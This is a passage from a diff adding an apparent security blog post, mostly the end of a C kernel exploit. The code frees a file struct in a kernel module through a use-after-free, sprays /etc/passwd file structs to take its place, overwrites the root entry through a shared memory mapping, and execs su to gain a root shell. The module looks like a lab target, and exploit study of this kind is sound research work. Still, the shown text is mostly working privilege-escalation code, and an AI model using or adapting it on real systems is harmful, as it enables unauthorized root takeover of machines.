+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Fork &amp; wait for success</span><span>&quot;);
+</span><span>	pid = </span><span style="color:#bf616a;">fork</span><span>();
+</span><span>	</span><span style="color:#b48ead;">if</span><span>(pid == -</span><span style="color:#d08770;">1</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to fork for a new process</span><span>&quot;);
+</span><span>	}
+</span><span>	</span><span style="color:#b48ead;">else if</span><span>(pid == </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		
+</span><span>		</span><span style="color:#65737e;">// Waiting for corruption completion.
+</span><span>		</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">3</span><span>);
+</span><span>	
+</span><span>	 	</span><span style="color:#65737e;">// Changing user to root.
+</span><span>		</span><span style="color:#b48ead;">char </span><span>*argvx[</span><span style="color:#d08770;">3</span><span>] = { &quot;</span><span style="color:#a3be8c;">/bin/su</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">root</span><span>&quot;, </span><span style="color:#d08770;">NULL </span><span>};
+</span><span>		</span><span style="color:#bf616a;">execve</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/su</span><span>&quot;, &amp;argvx, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>		
+</span><span>		</span><span style="color:#65737e;">// Should never be reached.
+</span><span>		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span>;
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Opening LKM.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Opening LKM</span><span>&quot;);
+</span><span>	device_fd = </span><span style="color:#bf616a;">open</span><span>(DEVICE_FILE, O_RDONLY);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(device_fd &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to open device file</span><span>&quot;);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Opening tmp file.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Opening tmp file</span><span>&quot;);
+</span><span>	fd0 = </span><span style="color:#bf616a;">open</span><span>(TMP_FILE, O_CREAT | O_RDWR, </span><span style="color:#d08770;">0666</span><span>);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(fd0 &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to open </span><span style="color:#d08770;">%s</span><span>&quot;, TMP_FILE);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Allocating some bytes into tmp file to prevent bus error.
+</span><span>	</span><span style="color:#65737e;">// fallocate or ftruncate are other viable options.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Allocating some bytes into tmp file to prevent bus error</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">write</span><span>(fd0, placeholder, </span><span style="color:#96b5b4;">strlen</span><span>(placeholder));
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Mapping tmp file into memory.
+</span><span>	</span><span style="color:#65737e;">// Size 1 allocates minimum size which is an entire page.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Mapping tmp file into memory</span><span>&quot;);
+</span><span>	ptr = </span><span style="color:#bf616a;">mmap</span><span>(</span><span style="color:#d08770;">NULL</span><span>, </span><span style="color:#d08770;">1</span><span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, </span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(ptr == MAP_FAILED) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to map </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> into memory</span><span>&quot;, TMP_FILE);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Limiting the max amount of file descriptors.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Limiting max amount of file descriptors</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">set_fd_limit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">4096</span><span>);	
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Forcing file struct release through file-&gt;f_count-&gt;counter decrement. 
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Forcing file struct release. Expecting EBADF:</span><span>&quot;);
+</span><span>	fd1 = </span><span style="color:#bf616a;">install_file</span><span>(device_fd, &amp;fd0);
+</span><span>	fd1 = </span><span style="color:#bf616a;">install_file</span><span>(device_fd, &amp;fd0);
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Extending max amount of file descriptors.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Extending max amount of file descriptors</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">set_fd_limit</span><span>(</span><span style="color:#d08770;">4096</span><span>, </span><span style="color:#d08770;">4096</span><span>);	
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Spray to fill the previously freed file struct with a /etc/passwd file struct. 
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Spraying file structs pointing to /etc/passwd</span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">for</span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; </span><span style="color:#d08770;">512</span><span>; i++) {
+</span><span>		fd_spray[i] = </span><span style="color:#bf616a;">open</span><span>(&quot;</span><span style="color:#a3be8c;">/etc/passwd</span><span>&quot;, O_RDONLY);
+</span><span>       		</span><span style="color:#b48ead;">if </span><span>(fd_spray[i] &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>                	</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to spray /etc/passwd</span><span>&quot;);
+</span><span>        	}
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#65737e;">// Checking for successful UAF.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Checking for successful UAF. Content should be from /etc/passwd:</span><span>&quot;);
+</span><span>	</span><span style="color:#96b5b4;">fputs</span><span>(ptr, stdout);
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Overwriting /etc/passwd root entry.
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Overwriting /etc/passwd root entry. Content should have been modified:</span><span>&quot;);
+</span><span>	</span><span style="color:#96b5b4;">memcpy</span><span>(ptr, privesc, </span><span style="color:#96b5b4;">strlen</span><span>(privesc));
+</span><span>	</span><span style="color:#96b5b4;">fputs</span><span>(ptr, stdout);
+</span><span>
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Entering eternal loop.	
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Corruption process has been completed. Waiting for a root shell...</span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">while</span><span>(</span><span style="color:#d08770;">1</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">10</span><span>);
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span>;
+</span><span>}
+</span></code></pre>
+ <!---->
+
+
+<div
+  class="my-4 flex flex-col rounded-lg bg-[var(--admonition-bg)]"
+  style="--admonition-bg: rgba(68, 138, 255, 0.1)"
+>
+  <div class="flex items-center rounded-t-lg bg-[var(--admonition-bg)] p-1">
+    <div
+      class="mx-2 h-4 w-4 text-[0] [background:var(--url)_center_center_no-repeat] dark:invert"
+      style="--url: url(./icons/note.svg)"
+    >
+      note
+    </div>
+    <span><strong>note</strong></span>
+  </div>
+  <div class="pl-4"><p>If you find a misconception or an error in any of my posts, please <a href="mailto:gum3t@proton.me">contact me</a> and I'll fix it asap.</p>
+</div>
+</div>
+</section>
+
+  <hr />
+
+  <!-- Post Taxonomies -->
+  
+<footer class="mt-12 flex flex-col">
+  <!---->
+  <!---->
+  <!---->
+  <!---->
+  
+  <div class="mb-2 flex flex-wrap">
+    <span class="block-bg mb-1.5 mr-1.5 rounded-lg px-5 py-1.5">Tags </span>
+    
+    <a
+      class="block-bg block-hover mb-1.5 mr-1.5 rounded-lg px-5 py-1.5 no-underline"
+      href="https://gum3t.xyz/tags/fd/"
+      >fd</a
+    >
+    
+    <a
+      class="block-bg block-hover mb-1.5 mr-1.5 rounded-lg px-5 py-1.5 no-underline"
+      href="https://gum3t.xyz/tags/kernel/"
+      >kernel</a
+    >
+    
+    <a
+      class="block-bg block-hover mb-1.5 mr-1.5 rounded-lg px-5 py-1.5 no-underline"
+      href="https://gum3t.xyz/tags/linux/"
+      >linux</a
+    >
+    
+    <a
+      class="block-bg block-hover mb-1.5 mr-1.5 rounded-lg px-5 py-1.5 no-underline"
+      href="https://gum3t.xyz/tags/uaf/"
+      >uaf</a
+    >
+    
+  </div>
+  
+</footer>
+
+<!---->
+
+  <!-- Post Nav -->
+  
+<!---->
+
+  <!-- Comment -->
+  
+</article>
+
+    </main>
+
+    <footer class="mx-auto flex max-w-3xl flex-wrap items-center px-8 py-4 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+    
+    &copy; 
+    2020 - 2025
+    
+    <a class="link" href="https://gum3t.xyz"
+      >gum3t</a
+    >
+     |<!---->
+    <!---->
+    <a class="link" href="https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-sa&#x2F;4.0&#x2F;deed" rel="noopener" target="_blank">
+      CC BY-SA 4.0
+    </a>
+    <!---->
+    
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <a class="link" href="https://github.com/st1020/kita" rel="noopener" target="_blank">✎ Kita by st1020</a>
+  </div>
+</footer>
+
+  </body>
+</html>
